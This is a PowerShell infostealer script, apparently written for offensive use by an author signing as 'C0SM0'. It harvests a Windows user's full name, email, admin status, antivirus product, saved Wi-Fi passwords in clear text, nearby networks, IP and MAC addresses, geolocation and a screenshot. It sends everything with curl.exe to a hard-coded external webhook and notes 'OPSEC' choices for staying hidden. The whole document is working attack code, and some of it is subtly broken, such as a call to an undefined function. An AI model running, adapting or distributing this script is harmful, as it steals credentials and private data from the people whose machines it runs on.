# spidercat webhook script
# created by : C0SM0

# change me
$webhook ="https://us-central1-obsidian-buffer.cloudfunctions.net/webhook/66f654cd634818af791be23ec9b2dc8ea2cd2a32ead56650"
# variables
$account = $env:userprofile.Split('\')[2]
$username = $env:username
$markdown = "$account.md"

# network values
# possible replacement for using curl.exe (better OPSEC)
# $public = Resolve-DnsName -Server ns1.google.com -Type TXT -Name o-o.myaddr.l.google.com | Select-Object -ExpandProperty 'Strings'
$public = curl.exe https://ident.me
$private = (get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}).ipaddress[0]
$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)

# send content to obsidian
function send_to_obsidian {

    # file parameter
    [CmdletBinding()]
    param (
    [Parameter (Position=0,Mandatory = $True)]
    [string]$message,
    [Parameter (Position=1,Mandatory = $True)]
    [string]$file
    )

    # curl requests
    curl.exe -d "$message" -H "Content-Type: text/plain" "$webhook`?path=$file"
}

# takes a screenshot and sends it to the Obsidian webhook
function send_screenshot_to_obsidian {
    # take screenshot
    $screenshot = (New-Object -ComObject Wia.ImageFile).Capture()

    # convert screenshot to base64-encoded image
    $imageData = [System.Convert]::ToBase64String($screenshot.FileData)

    # create message object
    $messageData = @{
        content = "Screenshot"
        embeds = @(
            @{
                title = "Screenshot"
                image = @{
                    url = "data:image/png;base64,$imageData"
                }
            }
        )
    }

    # send message to Obsidian webhook
    PerformHttpRequest -Uri $webhook -Method Post -Body (ConvertTo-Json $messageData) -ContentType "application/json"
}

function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }

    # Write Error is just for troubleshooting
    catch {Write-Error "No name was detected"
    return "NA"
    -ErrorAction SilentlyContinue
    }

    return $fullName
}

function Get-email {

    try {

    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
	return $email
    }

    # Write Error is just for troubleshooting
    catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }
}


function Get-IP-Information {
    $ipinfo = curl.exe "https://ipinfo.io" | ConvertFrom-Json

    return $ipinfo
}

function Get-AntivirusSolution {
    try {
        $Antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop
        if ($Antivirus) {
            $AntivirusSolution = $Antivirus.displayName
        }
        else {
            $AntivirusSolution = "NA"
        }
    }
    catch {
        Write-Error "Unable to get Antivirus Solution: $_"
        $AntivirusSolution = "NA"
    }
    return $AntivirusSolution
}

# markdown wireless information
function wireless_markdown {
    # get wireless creds
    $SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
    $wifi_info = foreach($SSID in $SSIDS) {
        $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
    }
    $wifi_json = $wifi_info | ConvertTo-Json | ConvertFrom-Json

    for ($i = 0; $i -le $wifi_json.Length; $i++) {
        $wifi_name = $wifi_json.SSID[$i]
        $wifi_pass = $wifi_json.Password[$i]

        $content = @"
# $wifi_name
- SSID : $wifi_name
- Password : $wifi_pass

## Tags
#wifi
"@
        send_to_obsidian -message $content -file "$wifi_name.md"
    }
    return $wifi_json
}
# mark user information
function user_markdown {

    # general values
    $full_name = Get-fullName
    $email = Get-email
    $is_admin = (Get-LocalGroupMember 'Administrators').Name -contains "$env:COMPUTERNAME\$env:USERNAME"
    $antivirus = Get-AntivirusSolution

    # create markdown content
    $content = @"
# $account

##General
- Full Name : $full_name
- Email : $email

## User Info
- UserName : $username
- UserProfile : $account
- Admin : $is_admin

## Wireless
- Public : $public
- Private : $private
- MAC : $MAC

## PC Information
- Antivirus : $antivirus

## Connected Networks
"@
    # send data set one
    send_to_obsidian -message $content -file $markdown

    # get saved wireless data
    $wifi_json = wireless_markdown

    # add known connections
    for ($i = 0; $i -le $wifi_json.Length; $i++) {
        $wifi_name = $wifi_json.SSID[$i]

        send_to_obsidian -message "- [[$wifi_name]]" -file $markdown
    }

    # setup nearby netwoks
    send_to_obsidian -message "`n## Nearby Networks" -file $markdown

    # attempt to rea/wireld nearby networks
    try {
        # get nearby ssids
        $nearby_ssids = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()

        # clean for iteration
        $nearby_networks = $nearby_ssids | ConvertTo-Json | ConvertFrom-Json

        # format and add ssids
        for ($i = 0; $i -le $nearby_networks.Length; $i++) {

            if ($nearby_networks[$i] -like "SSID*") {
                $formatted_ssid = $nearby_networks[$i] | Out-String
                $formatted_ssid = $formatted_ssid.Split(":")[1] | Out-String
                $formatted_ssid = $formatted_ssid.Replace(" ", "").Replace("`n","")

                send_to_obsidian -message "-#$formatted_ssid" -file $markdown
            }
        }
    }

    # exception
    catch {
        send_to_obsidian -message "- No nearby wifi networks detected" -file $markdown
    }

    # ip information
    $ip_information = Get-IP-Information
    send_to_obsidian -message "`n## IP Information:$($ip_information | Out-String )" -file $markdown
    $latitude, $longitude = $ip_information.loc.Split(',')
    $city = $ip_information.city.replace(' ', '-')
    $region = $ip_information.region.replace(' ', '-')
    $country = $ip_information.country.replace(' ', '-')
    $organization = $ip_information.org.replace(' ', '-')
    $zipcode = $ip_information.postal
    $timezone = $ip_information.timezone.replace(' ', '-')

    # write ip info and geolocation
    $content = @"
## Geolocation
<div class="mapouter"><div class="gmap_canvas"><iframe width="600" height="500" id="gmap_canvas" src="https://maps.google.com/maps?q=$latitude,$longitude&t=k&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe><br><style>.mapouter{position:relative;text-align:right;height:500px;width:600px;}</style><style>.gmap_canvas {overflow:hidden;background:none!important;height:500px;width:600px;}</style></div></div>

## Tags
#user #$city #$region #$country #$organization #zip-$zipcode #$timezone
"@
    # send data set two
    send_to_obsidian -message $content -file $markdown

    # take screenshot and send to Obsidian webhook
    send_screenshot_to_obsidian
}

user_markdown
